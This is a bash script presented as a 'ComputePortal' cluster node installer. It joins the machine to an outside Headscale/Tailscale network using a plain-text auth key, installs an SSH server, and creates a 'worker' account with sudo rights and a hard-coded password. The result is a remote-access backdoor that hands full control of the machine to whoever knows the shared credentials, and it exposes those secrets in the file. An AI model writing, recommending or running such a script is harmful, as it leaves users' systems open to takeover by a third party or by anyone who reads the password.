#!/bin/bash

# ComputePortal Cluster Node Installation and Network Join Script
echo "Installing Cluster Node Interface..."
sudo snap install tailscale
sudo tailscale up --auth-key=d2d63b15ee202cc9d7f12880d9d5d8a2662f50c52a848f04  --login-server=https://headscale.computeportal.net:8080 --accept-routes

# Install SSH Server
sudo apt install openssh-server

# Wait a moment for service to start
sleep 3

# Check status
echo "Cluster Node Interface service status:"
sudo tailscale status

# Create user account
echo ""
echo "Creating user account..."
sudo useradd -m -s /bin/bash worker
echo "worker:zxpouyj2zx" | sudo chpasswd
sudo usermod -aG sudo worker
echo "User 'worker' created with sudo privileges"

echo "Installation and network join complete!"
echo "Note: You may need to authorize this device in your network controller."
